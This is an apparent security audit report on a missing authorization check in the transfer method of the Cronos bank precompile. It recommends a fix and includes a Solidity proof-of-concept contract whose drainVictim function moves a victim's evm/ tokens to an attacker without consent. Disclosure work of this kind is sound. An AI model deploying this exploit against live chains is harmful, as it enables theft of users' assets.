### Title
Missing Caller Authorization in Bank Precompile `transfer` Allows Any Contract to Drain Native `evm/` Tokens from Any Holder - (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` method of the `BankContract` precompile accepts an arbitrary `sender` address from call arguments without verifying it matches `contract.Caller()`. Any deployed EVM contract can invoke `bank.transfer(victim, attacker, amount)` to move `evm/<contract_address>` native tokens out of any victim's Cosmos-side bank account without the victim's consent.

---

### Finding Description

The bank precompile at `x/cronos/keeper/precompiles/bank.go` exposes four methods: `mint`, `burn`, `balanceOf`, and `transfer`. The denom for all operations is derived from the calling contract's address via `EVMDenom(contract.Caller())` — i.e., `evm/<calling_contract_address>`. This design makes the calling contract the authority over its own denom.

For `mint` and `burn`, this is consistent: the calling contract mints/burns its own denom tokens to/from a specified address. No external account can impersonate the contract as the denom authority.

However, the `transfer` case has a critical divergence:

```go
// TransferMethodName case — bank.go lines 175–192
sender := args[0].(common.Address)   // ← arbitrary, from call input
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())  // denom tied to calling contract
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))  // ← from is NOT contract.Caller()
```

`sender` (line 175) is taken directly from the ABI-decoded call arguments. There is **no check** that `sender == contract.Caller()`. The `SendCoins` call on line 192 therefore moves tokens from an **attacker-controlled arbitrary address** rather than from the calling contract itself. [1](#0-0) 

The only guard present is `checkBlockedAddr(to)`, which only prevents sending to module-blocked addresses — it does not verify the sender's authorization. [2](#0-1) 

---

### Impact Explanation

**Critical — Unauthorized transfer of precompile-controlled native assets.**

Any EVM contract can:
1. Call `bank.mint(victim, amount)` to seed `evm/<contract_address>` tokens into victim accounts (or victims receive them through any legitimate interaction with the contract).
2. Later call `bank.transfer(victim, attacker, victim_balance)` to drain those tokens from the victim's Cosmos bank account to the attacker's address — with no approval or signature from the victim.

The `evm/` denom tokens are Cosmos-side native assets managed by `x/bank`. Their balances are real, transferable, and can be converted back to EVM-side representations. Unauthorized draining of these balances is a direct, irreversible accounting change for precompile-controlled assets, matching the Critical impact tier. [3](#0-2) 

---

### Likelihood Explanation

**High.** The attack requires only:
- Deploying a standard EVM contract (unprivileged, permissionless on Cronos).
- Calling the bank precompile at address `0x0000000000000000000000000000000000000064` with a crafted `transfer(victim, attacker, amount)` calldata.

No leaked keys, governance access, or validator compromise is needed. Any EOA or contract can trigger this path in a single transaction. [4](#0-3) 

---

### Recommendation

In the `TransferMethodName` case, enforce that the `sender` argument equals `contract.Caller()` before executing `SendCoins`. Add the following guard immediately after unpacking arguments:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the calling contract")
}
```

This mirrors the authorization model already implicit in `mint`/`burn`, where `contract.Caller()` is the sole authority over its denom. [5](#0-4) 

---

### Proof of Concept

Deploy the following malicious contract on Cronos EVM. It first mints `evm/<MaliciousContract>` tokens to a victim (simulating any prior distribution), then drains them without the victim's authorization:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
    function balanceOf(address, address) external view returns (uint256);
}

contract MaliciousBank {
    address constant BANK_PRECOMPILE = 0x0000000000000000000000000000000000000064;
    IBankModule bank = IBankModule(BANK_PRECOMPILE);

    // Step 1: seed victim with evm/<this> tokens
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim — no victim signature required
    function drainVictim(address victim, address attacker, uint256 amount) external {
        // sender = victim (arbitrary arg), no check against msg.sender or address(this)
        bank.transfer(victim, attacker, amount);
    }
}
```

**Expected outcome:**

```
// Before drainVictim:
bank.balanceOf(address(MaliciousBank), victim) == 1_000_000

// After drainVictim(victim, attacker, 1_000_000):
bank.balanceOf(address(MaliciousBank), victim)   == 0
bank.balanceOf(address(MaliciousBank), attacker) == 1_000_000
```

The `drainVictim` call succeeds with no revert, transferring the victim's entire `evm/<MaliciousBank>` native balance to the attacker — with zero authorization from the victim. [6](#0-5) [7](#0-6)
